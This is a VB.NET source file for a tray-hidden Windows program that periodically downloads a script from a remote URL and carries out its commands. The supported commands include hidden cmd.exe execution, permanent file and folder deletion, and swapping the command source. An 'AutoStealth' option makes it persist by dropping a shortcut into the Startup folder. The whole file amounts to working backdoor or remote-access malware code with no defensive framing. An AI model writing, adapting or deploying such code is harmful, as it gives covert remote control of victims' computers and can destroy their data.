Public Class MainX
    Dim urlxx As String = "C:\Users\" & Environment.UserName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RemoteExec.url"

    Dim fetchedScript As String = ""
    Dim scriptFetchError As Boolean = False
    Dim ScriptContent As String = ""
    Dim ScriptRan As Boolean = False

    Private Sub MainX_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Icon = My.Resources.script
        notIcon.Icon = My.Resources.script
    End Sub

    Private Sub MainX_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Me.Hide()
    End Sub

    Private Sub timGetExec_Tick(sender As Object, e As EventArgs) Handles timGetExec.Tick
        If Not bgGetScript.IsBusy Then
            bgGetScript.RunWorkerAsync()
        End If
    End Sub

    Private Sub bgGetScript_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles bgGetScript.DoWork
        timGetExec.Enabled = False
        Try
            Using client As New Net.WebClient, reader As IO.StreamReader = New IO.StreamReader(client.OpenRead(txtURL.Text))
                fetchedScript = reader.ReadToEnd.Normalize
            End Using

            scriptFetchError = False
        Catch ex As Exception
            scriptFetchError = True
        End Try
    End Sub

    Private Sub bgGetScript_RunWorkerCompleted(sender As Object, e As System.ComponentModel.RunWorkerCompletedEventArgs) Handles bgGetScript.RunWorkerCompleted
        'check if content is same else exec
        If Not fetchedScript = ScriptContent And Not scriptFetchError Then
            ScriptContent = fetchedScript

            'script ran reset (also new scripts)
            ScriptRan = False
        End If

        'exec script
        If Not ScriptRan Then
            ExecScript(ScriptContent)

            'Run once per new script?
            If toolStripChOccuOnce.Checked Then
                ScriptRan = True
            Else
                ScriptRan = False
            End If
        End If

        'continue timer only when invisible
        If Not Me.Visible Then
            timGetExec.Enabled = True
        End If
    End Sub

    Private Sub butHide_Click(sender As Object, e As EventArgs) Handles butHide.Click
        If Not Uri.IsWellFormedUriString(txtURL.Text, UriKind.Absolute) Then
            MessageBox.Show("Invalid Script Path!", "Invalid!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            txtURL.Focus()
            Exit Sub
        End If

        Me.Hide()
        notIcon.Visible = True

        timGetExec.Interval = CInt(Val(toolStriptxtInterval.Text) * 60000)
        timGetExec.Enabled = True
    End Sub

    Private Sub notIcon_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles notIcon.MouseDoubleClick
        timGetExec.Enabled = False
        ScriptContent = Nothing

        Me.Show()
        Me.Activate()
        notIcon.Visible = False
    End Sub

    Private Sub butOptions_MouseDown(sender As Object, e As MouseEventArgs) Handles butOptions.MouseDown
        conMenuOptions.Show(MousePosition.X, MousePosition.Y)
    End Sub

    Private Sub conMenuOptions_Closing(sender As Object, e As ToolStripDropDownClosingEventArgs) Handles conMenuOptions.Closing
        If String.IsNullOrWhiteSpace(toolStriptxtInterval.Text) Or Not IsNumeric(toolStriptxtInterval.Text) Then
            toolStriptxtInterval.Text = "4"
        End If
        toolStriptxtInterval.Text = FormatNumber(toolStriptxtInterval.Text, 2)
    End Sub

    Private Sub toolStripChAutoStealth_CheckedChanged(sender As Object, e As EventArgs) Handles toolStripChAutoStealth.CheckedChanged
        If toolStripChAutoStealth.Checked Then
            If Not My.Computer.FileSystem.FileExists(urlxx) Then
                My.Computer.FileSystem.WriteAllText(urlxx, "[InternetShortcut]" & vbCrLf & "URL=file:///" & Replace(System.Reflection.Assembly.GetExecutingAssembly().Location, "\", "/"), False)
            End If
        Else
            If My.Computer.FileSystem.FileExists(urlxx) Then
                My.Computer.FileSystem.DeleteFile(urlxx, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.DoNothing)
            End If
        End If
    End Sub

    Private Sub ExecScript(ByVal ScriptContent As String)
        Dim ScriptLines As List(Of String) = New List(Of String)(ScriptContent.Split({vbCrLf, vbCr, vbLf}, StringSplitOptions.RemoveEmptyEntries).Where(Function(x) Not String.IsNullOrWhiteSpace(x)).Select(Function(x) x.Trim))

        'execute per line, case sensitive
        For Each ScriptLine As String In ScriptLines
            'skip if not using standard param
            If Not ScriptLine.Contains("~>") Then Exit For

            'Dissect Line
            Dim ScriptParam() As String = ScriptLine.Replace("  ", " ").Split({"~>"}, StringSplitOptions.RemoveEmptyEntries).Select(Function(x) x.Trim).ToArray
            Console.WriteLine(ScriptLine)

            If Not ScriptParam.Length = 2 Then Exit For
            Dim firstParam As String = ScriptParam(0)
            Dim secondParam As String = ScriptParam(1)

            'exec param
            If firstParam = "RefInt" Then
                If IsNumeric(secondParam) Then
                    timGetExec.Interval = CInt(Val(secondParam) * 60000)
                End If
            ElseIf firstParam = "RunOnce" Then
                If secondParam = "0" Then
                    toolStripChOccuOnce.Checked = False
                ElseIf secondParam = "1" Then
                    toolStripChOccuOnce.Checked = True
                End If
            ElseIf firstParam = "ScriptSrc" Then
                If Uri.IsWellFormedUriString(secondParam, UriKind.Absolute) Then
                    txtURL.Text = secondParam
                End If
            ElseIf firstParam = "MsgBox" Then
                If Not ExecMsgBox.Visible Then
                    ExecMsgBox.Show(Me)
                End If
                ExecMsgBox.rtbMsgBox.Text = Replace(secondParam, "\n", vbCrLf)
                ExecMsgBox.Activate()
            ElseIf firstParam = "cmd" Then
                Try
                    Dim process As New System.Diagnostics.Process()
                    Dim startInfo As New System.Diagnostics.ProcessStartInfo()
                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
                    startInfo.FileName = "cmd.exe"
                    startInfo.Arguments = "/c " & Replace(secondParam, "\n", vbCrLf)
                    process.StartInfo = startInfo
                    process.Start()
                Catch ex As Exception
                    Console.WriteLine("[" & Err.Source & "]" & vbCrLf & Err.Description)
                End Try
            ElseIf firstParam = "FileDel" Then
                'Deletes file permanently
                If My.Computer.FileSystem.FileExists(secondParam) Then
                    Try
                        My.Computer.FileSystem.DeleteFile(secondParam, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.DoNothing)
                    Catch ex As Exception
                        Console.WriteLine("[" & Err.Source & "]" & vbCrLf & Err.Description)
                    End Try
                End If
            ElseIf firstParam = "FolderDel" Then
                'Deletes folder+contents permanently
                If My.Computer.FileSystem.DirectoryExists(secondParam) Then
                    Try
                        My.Computer.FileSystem.DeleteDirectory(secondParam, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.DoNothing)
                    Catch ex As Exception
                        Console.WriteLine("[" & Err.Source & "]" & vbCrLf & Err.Description)
                    End Try
                End If

            End If
        Next
    End Sub
End Class